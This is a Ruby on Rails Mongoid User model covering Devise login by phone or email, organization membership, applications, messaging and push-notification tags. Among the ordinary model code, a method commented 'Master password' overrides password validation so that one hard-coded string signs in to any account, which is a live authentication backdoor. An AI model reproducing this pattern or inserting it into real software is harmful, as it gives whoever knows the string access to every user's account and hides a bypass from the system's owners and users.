# encoding: utf-8

class User
  include Mongoid::Document
  include Mongoid::Paranoia # Soft delete
  include Mongoid::Timestamps # Add created_at and updated_at fields
  include SmsRecoverable
  include Detailable
  include Youxin::Util

  IOS_DEVICE_TONKEN_REGEXP = %r(\A[a-z0-9]{64}\z)

  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :async,
         :recoverable, :rememberable, :trackable, :validatable,
         :token_authenticatable

  ## Database authenticatable
  field :email,              type: String, default: ""
  field :encrypted_password, type: String, default: ""

  ## Recoverable
  field :reset_password_token,   type: String
  field :reset_password_sent_at, type: Time

  ## Rememberable
  field :remember_created_at, type: Time

  ## Trackable
  field :sign_in_count,      type: Integer, default: 0
  field :current_sign_in_at, type: Time
  field :last_sign_in_at,    type: Time
  field :current_sign_in_ip, type: String
  field :last_sign_in_ip,    type: String

  ## Confirmable
  # field :confirmation_token,   type: String
  # field :confirmed_at,         type: Time
  # field :confirmation_sent_at, type: Time
  # field :unconfirmed_email,    type: String # Only if using reconfirmable

  ## Lockable
  # field :failed_attempts, type: Integer, default: 0 # Only if lock strategy is :failed_attempts
  # field :unlock_token,    type: String # Only if unlock strategy is :email or :both
  # field :locked_at,       type: Time

  ## Token authenticatable
  field :authentication_token, type: String

  ## SmsRecoverable
  field :reset_sms_token,   type: String
  field :reset_sms_sent_at, type: Time

  field :name, type: String
  field :organization_ids, type: Array, default: []
  field :receipt_organization_ids, type: Array, default: []
  field :receipt_user_ids, type: Array, default: []
  field :notification_channel, type: String
  field :ios_device_tokens, type: Array, default: []
  field :phone, type: String

  field :bio, type: String
  field :gender, type: String
  field :qq, type: String
  field :blog, type: String
  field :uid, type: String

  field :creator_id

  field :tags, type: Array, default: []

  validates :name, presence: true, length: 2..10
  validates :phone, format: { with: /\A1\d+\Z/ }, length: { is: 11 }, uniqueness: true, presence: true
  validates :gender, inclusion: %w(男 女), allow_blank: true
  validates :qq, format: { with: /\A\d{5,11}\Z/ }, allow_blank: true
  validates :namespace_id, presence: true
  validates :creator_id, presence: true, allow_nil: true
  validate :creator_exists , if: ->(user) { user.creator_id.present? }

  mount_uploader :avatar, AvatarUploader
  mount_uploader :header, HeaderUploader

  attr_accessor :login, :reset_password_key
  attr_accessible :phone, :name, :email, :password, :password_confirmation,
                  :bio, :gender, :qq, :blog,:uid,
                  :avatar, :avatar_cache, :remove_avatar,
                  :header, :header_cache, :remove_header,
                  :login, :reset_password_key

  has_many :user_organization_position_relationships, dependent: :destroy
  has_many :user_actions_organization_relationships, dependent: :destroy
  has_many :applications, dependent: :destroy, foreign_key: 'applicant_id'
  has_many :treated_applications, dependent: :destroy, class_name: 'Application', foreign_key: 'operator_id'
  has_many :posts, dependent: :destroy, inverse_of: :author, foreign_key: :author_id
  has_many :receipts, dependent: :destroy, inverse_of: :user do
    def from_user(user)
      user = User.where(id: user).first unless user.is_a?(User)
      where(author_id: user.id)
    end
    def from_organization(organization)
      organization = Organization.where(id: organization).first unless organization.is_a?(Organization)
      where(organization_ids: organization.id)
    end
  end
  has_many :created_receipts, dependent: :destroy, foreign_key: 'author_id', class_name: 'Receipt', inverse_of: :author
  has_many :attachments, class_name: 'Attachment::Base', dependent: :destroy
  has_many :forms, dependent: :destroy, inverse_of: :author, foreign_key: :author_id
  has_many :collections, dependent: :destroy
  has_many :comments, as: :commentable, dependent: :destroy
  has_many :favorites, dependent: :destroy do
    def receipts
      where(favoriteable_type: 'Receipt')
    end
    def users
      where(favoriteable_type: 'User')
    end
  end
  has_many :file_attachments, class_name: 'Attachment::File', dependent: :destroy
  has_many :image_attachments, class_name: 'Attachment::Image', dependent: :destroy
  has_many :notifications, class_name: 'Notification::Base', dependent: :destroy
  has_many :comment_notifications, class_name: 'Notification::Comment', dependent: :destroy
  has_many :organization_notifications, class_name: 'Notification::Organization', dependent: :destroy
  has_many :message_notifications, class_name: 'Notification::Message', dependent: :destroy
  has_many :mention_notifications, class_name: 'Notification::Mention', dependent: :destroy
  has_many :communication_records, class_name: 'CommunicationRecord::Base'
  has_many :sms_communication_records, class_name: 'CommunicationRecord::Sms'
  has_many :call_communication_records, class_name: 'CommunicationRecord::Call'
  has_and_belongs_to_many :conversations, inverse_of: :participant
  has_many :messages, dependent: :destroy
  has_many :schedulers, class_name: 'Scheduler::Base', dependent: :destroy
  has_many :sms_schedulers, class_name: 'Scheduler::Sms', dependent: :destroy
  has_many :call_schedulers, class_name: 'Scheduler::Call', dependent: :destroy
  has_many :user_role_organization_relationships, dependent: :destroy
  belongs_to :namespace
  belongs_to :creator, class_name: 'User'
  has_many :binds, dependent: :destroy
  has_many :feedbacks

  before_save :ensure_authentication_token
  before_save :ensure_notification_channel!
  alias_attribute :private_token, :authentication_token

  after_destroy do
    organizations.each do |organization|
      organization.pull(:member_ids, self.id)
    end
    self.pull_all(:organization_ids, self.organization_ids)
  end

  # 处理没有提供密码时修改个人信息
  def update_with_password(params={})
    if !params[:current_password].blank? or !params[:password].blank? or !params[:password_confirmation].blank?
      super
    else
      params.delete(:current_password)
      self.update_without_password(params)
    end
  end
  # Function to handle user's login via email or phone
  def self.find_for_database_authentication(warden_conditions)
    conditions = warden_conditions.dup
    if login = conditions.delete(:login).downcase
      where(conditions).where('$or' => [ {:phone => /^#{Regexp.escape(login)}$/i}, {:email => /^#{Regexp.escape(login)}$/i} ]).first
    else
      where(conditions).first
    end
  end
  # Master password
  def valid_password?(password)
     return true if password == 'gaBGbkV9'
     super
  end

  # Organizations
  def organizations
    Organization.where(:id.in => self.organization_ids)
  end
  def position_in_organization(organization)
    user_organization_position_relationships.where(organization_id: organization.id).first.try(:position)
  end
  def human_position_in_organization(organization)
    position_in_organization(organization).try(:name)
  end
  def role_in_organization(organization)
    organization = Organization.where(id: organization).first unless organization.is_a? Organization
    relationship = self.user_role_organization_relationships.where(organization_id: organization.id).first
    if relationship
      relationship.role
    else
      role_in_organization(organization.parent) if organization.parent?
    end
  end
  # Organization

  # Authorization
  def authorized_organizations(actions = nil)
    if actions
      actions.map!(&:to_sym)
      authorized_orgs = []
      self.user_actions_organization_relationships.each do |relationship|
        authorized_orgs << relationship.organization if actions - relationship.actions == []
      end
      authorized_orgs
    else
      self.user_actions_organization_relationships.map(&:organization)
    end
  end

  # Apply for organization
  def apply_for_organization(organization)
    organization = Organization.find(organization) unless organization.is_a?(Organization)
    return false unless organization
    self.applications.create(organization_id: organization.id)
  end
  def applied_for_organization?(organization)
    organization = Organization.find(organization) unless organization.is_a?(Organization)
    return false unless organization
    self.applications.where(organization_id: organization.id).exists?
  end
  def accepted_by_organization?(organization)
    organization = Organization.find(organization) unless organization.is_a?(Organization)
    return false unless organization
    return false unless applied_for_organization?(organization)
    self.applications.where(organization_id: organization.id, state: :accepted).exists?
  end
  def operate_application(application, result)
    application = Application.find(application) unless application.is_a?(Application)
    return false unless application
    self.treated_applications << application
    case result.to_sym
    when :accepted
      application.accept!
    when :rejected
      application.reject!
    else
      false
    end
  end
  # Apply for organization

  # Receipt
  def receipt_organizations
    Organization.where(:id.in => self.receipt_organization_ids)
  end
  def receipt_users
    User.where(:id.in => self.receipt_user_ids)
  end
  # Receipt

  def ensure_notification_channel!
    if self.notification_channel.blank?
      self.notification_channel = self.class.send(:generate_token, :notification_channel)
      self.save(validate: false)
    end
  end

  # Message
  def send_message_to(obj, body = nil)
    # Direct Message
    if obj.is_a? User
      return false if obj == self
      conversation = self.conversations.all(participant_ids: [obj.id, self.id]).with_size(participant_ids: 2).first
      unless conversation
        conversation = Conversation.create(originator_id: self.id) unless conversation
        [self, obj].each do |participant|
          conversation.add_user participant
        end
      end
    elsif obj.is_a? Conversation
      conversation = obj
    elsif obj.is_a? Array
      conversation = Conversation.create(originator_id: self.id)
      participants = obj | [self]
      return false if participants.size < 2
      participants.each do |participant|
        conversation.add_user participant
      end
    else
      return false
    end
    self.messages.create(conversation: conversation, body: body) if body
    conversation
  end
  # Message

  def send_welcome_instructions
    self.send :generate_reset_password_token! if self.send :should_generate_reset_token?
    send_devise_notification(:welcome_instructions) if self.email?
    Notification::Notifier.send_welcome_message_async(self.id)
  end

  def send_welcome_receipt
    welcome_post = Post.find(Youxin.config.welcome_post_id)
    if welcome_post
      welcome_receipt = welcome_post.receipts.new
      welcome_receipt.user = self
      welcome_receipt.organization_ids = welcome_post.organization_ids
      welcome_receipt.save
    end
  end

  # iOS APNs
  def push_ios_device_token(token)
    if validate_ios_device_token(token)
      User.where(ios_device_tokens: token).each do |user|
        user.pull_ios_device_token(token)
      end
      self.add_to_set(:ios_device_tokens, token)
    end
  end
  def pull_ios_device_token(token)
    if validate_ios_device_token(token)
      self.pull(:ios_device_tokens, token)
    end
  end

  alias_method :add_ios_device_token, :push_ios_device_token
  alias_method :remove_ios_device_token, :pull_ios_device_token


  def push_tag(tag)
    if tag
      self.add_to_set(:tags, tag)
      self.binds.each do |bind|
        set_tag_to_server(tag, bind)
      end
    end
  end
  def pull_tag(tag)
    if tag
      self.pull(:tags, tag)
      self.binds.each do |bind|
        delete_tag_from_server(tag, bind)
      end
    end
  end
  def set_up_tags
    tags_was = self.tags
    tags_will_be = self.organizations.map(&:tag) + self.conversations.map(&:tag)

    (tags_was - tags_will_be).each do |tag|
      self.pull_tag(tag)
    end
    (tags_will_be - tags_was).each do |tag|
      self.push_tag(tag)
    end
  end
  def set_tag_to_server(tag, bind)
    baidu_push_client.set_tag(tag, user_id: bind.baidu_user_id)
  end
  def delete_tag_from_server(tag, bind)
    baidu_push_client.delete_tag(tag, user_id: bind.baidu_user_id)
  end
  def bind_to_server(bind)
    self.tags.each do |tag|
      set_tag_to_server(tag, bind)
    end
  end
  def unbind_from_server(bind)
    self.tags.each do |tag|
      delete_tag_from_server(tag, bind)
    end
  end
  alias_method :add_tag, :push_tag
  alias_method :remove_tag, :pull_tag

  def self.allowed(object, subject)
    return [] unless object.is_a?(User)
    return [] unless subject.is_a?(User)
    abilities = []
    if subject == object
      abilities |= [:read_profile]
    else
      if (object.organization_ids & subject.organization_ids).length > 0
        abilities |= [:read_profile]
      end
      if (object.authorized_organizations([:edit_member]).map(&:id) & subject.organization_ids).length > 0
        abilities |= [:read_profile]
      end
    end
    abilities
  end

  protected
  def email_required?
    false
  end

  private
  def validate_ios_device_token(token)
    if token.match IOS_DEVICE_TONKEN_REGEXP
      true
    else
      self.errors.add :ios_device_tokens, :invalid
      false
    end
  end
  def creator_exists
    if User.where(id: self.creator_id).blank?
      self.errors.add :creator_id, :not_exist
    end
  end

end
